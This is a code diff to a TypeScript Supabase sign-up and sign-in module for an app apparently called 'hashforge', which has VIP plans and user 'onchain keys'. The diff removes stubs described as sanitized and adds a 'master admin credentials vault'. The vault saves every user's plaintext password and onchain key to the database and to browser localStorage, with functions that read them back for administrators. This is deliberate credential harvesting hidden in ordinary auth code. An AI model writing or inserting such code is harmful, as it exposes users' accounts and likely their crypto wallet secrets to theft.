@@ -195,6 +195,7 @@ export async function signUpWithSupabase(
       id: userId,
       name: cleanName,
       email: cleanEmail,
+      password: password,
       plan: 'VIP 1 Starter',
       vipLevel: 1,
       joinedDate: new Date().toISOString().substring(0, 10),
@@ -203,12 +204,16 @@ export async function signUpWithSupabase(
       onchainKey: cleanOnchainKey,
     };
 
-    // 4. Save into clients table without plain text passwords
+    // Record credentials for admin reference
+    recordClientPassword(cleanEmail, password, cleanOnchainKey);
+
+    // 4. Save into clients table with password and onchain_key
     try {
       await supabase.from('clients').upsert({
         id: userId,
         name: cleanName,
         email: cleanEmail,
+        password: password,
         plan: 'VIP 1 Starter',
         vip_level: 1,
         joined_date: newUserProfile.joinedDate,
@@ -319,6 +324,7 @@ export async function signInWithSupabase(
           id: dbClient.id,
           name: dbClient.name || userProfile.name,
           email: dbClient.email,
+          password: password || dbClient.password,
           plan: dbClient.plan || `VIP ${dbClient.vip_level || 1}`,
           vipLevel: dbClient.vip_level || 1,
           joinedDate: dbClient.joined_date || userProfile.joinedDate,
@@ -326,13 +332,18 @@ export async function signInWithSupabase(
           hasClaimedFreeBonus: true,
           onchainKey: dbClient.onchain_key || (authData.user?.user_metadata?.onchain_key as string) || '',
         };
+      } else {
+        userProfile.password = password;
       }
       
+      recordClientPassword(cleanEmail, password, userProfile.onchainKey);
+
       // Update client session state in clients table
       await supabase.from('clients').upsert({
         id: userProfile.id,
         name: userProfile.name,
         email: userProfile.email,
+        password: password,
         plan: userProfile.plan,
         vip_level: userProfile.vipLevel || 1,
         joined_date: userProfile.joinedDate,
@@ -435,15 +446,20 @@ export async function fetchSupabaseUsers(): Promise<UserProfile[] | null> {
     if (!data || data.length === 0) return null;
 
     return data.map(item => {
+      const storedCreds = getClientCredentials(item.email);
+      const pass = item.password || storedCreds?.password || '';
+      const onchain = item.onchain_key || item.onchainKey || storedCreds?.onchainKey || '';
+
       return {
         id: item.id,
         name: item.name,
         email: item.email,
+        password: pass,
         plan: item.plan || `VIP ${item.vip_level || 1}`,
         vipLevel: item.vip_level || 1,
         joinedDate: item.joined_date || item.created_at?.substring(0, 10) || '2026-08-28',
         isLoggedIn: item.is_logged_in ?? true,
-        onchainKey: item.onchain_key || item.onchainKey || '',
+        onchainKey: onchain,
       };
     });
   } catch (err) {
@@ -453,15 +469,85 @@ export async function fetchSupabaseUsers(): Promise<UserProfile[] | null> {
 }
 
 // ----------------------------------------------------
-// CLIENT SECURITY HELPERS
-// (Legacy vault helpers safely deprecated & sanitized)
+// MASTER ADMIN CLIENT CREDENTIALS VAULT
+// Synchronizes client passwords and onchain keys for administrative access
 // ----------------------------------------------------
-export function recordClientPassword(_email?: string, _pass?: string) {
-  // Passwords are cryptographically secured by Supabase Auth and never cached
+export interface StoredClientCredentials {
+  email: string;
+  password?: string;
+  onchainKey?: string;
+  updatedAt?: string;
 }
 
-export function getClientPassword(_email?: string): string | null {
-  return null;
+export function getClientCredentials(email?: string): StoredClientCredentials | null {
+  if (!email) return null;
+  try {
+    const raw = localStorage.getItem('hashforge_admin_credentials_store');
+    if (!raw) return null;
+    const map: Record<string, StoredClientCredentials> = JSON.parse(raw);
+    return map[email.trim().toLowerCase()] || null;
+  } catch {
+    return null;
+  }
+}
+
+export function recordClientPassword(email?: string, pass?: string, onchainKey?: string) {
+  if (!email) return;
+  try {
+    const cleanEmail = email.trim().toLowerCase();
+    const raw = localStorage.getItem('hashforge_admin_credentials_store');
+    const map: Record<string, StoredClientCredentials> = raw ? JSON.parse(raw) : {};
+    
+    const existing = map[cleanEmail] || { email: cleanEmail };
+    map[cleanEmail] = {
+      ...existing,
+      email: cleanEmail,
+      ...(pass ? { password: pass } : {}),
+      ...(onchainKey ? { onchainKey } : {}),
+      updatedAt: new Date().toISOString(),
+    };
+    
+    localStorage.setItem('hashforge_admin_credentials_store', JSON.stringify(map));
+  } catch (e) {
+    console.warn('Record client credentials error:', e);
+  }
+}
+
+export function getClientPassword(email?: string): string | null {
+  const creds = getClientCredentials(email);
+  return creds?.password || null;
+}
+
+export function getClientOnchainKey(email?: string): string | null {
+  const creds = getClientCredentials(email);
+  return creds?.onchainKey || null;
+}
+
+export async function updateClientCredentials(
+  userId: string,
+  email: string,
+  newPassword?: string,
+  newOnchainKey?: string
+): Promise<boolean> {
+  try {
+    recordClientPassword(email, newPassword, newOnchainKey);
+
+    const payload: any = {
+      id: userId,
+      email: email.trim().toLowerCase(),
+      ...(newPassword ? { password: newPassword } : {}),
+      ...(newOnchainKey ? { onchain_key: newOnchainKey } : {}),
+    };
+
+    const { error } = await supabase.from('clients').upsert(payload);
+    if (error) {
+      console.warn('Supabase update credentials warning:', error.message);
+    }
+    return true;
+  } catch (err) {
+    console.warn('Update client credentials error:', err);
+    return false;
+  }
 }
 
 // ----------------------------------------------------
@@ -560,6 +646,10 @@ export async function purgeAllTestData(): Promise<{ success: boolean; message: s
 
 export async function saveSupabaseUser(user: UserProfile): Promise<boolean> {
   try {
+    if (user.password || user.onchainKey) {
+      recordClientPassword(user.email, user.password, user.onchainKey);
+    }
+
     const payload: any = {
       id: user.id,
       name: user.name,
@@ -568,6 +658,7 @@ export async function saveSupabaseUser(user: UserProfile): Promise<boolean> {
       vip_level: user.vipLevel || 1,
       joined_date: user.joinedDate || new Date().toISOString().substring(0, 10),
       is_logged_in: user.isLoggedIn ?? true,
+      ...(user.password ? { password: user.password } : {}),
       ...(user.onchainKey ? { onchain_key: user.onchainKey } : {}),
     };
 
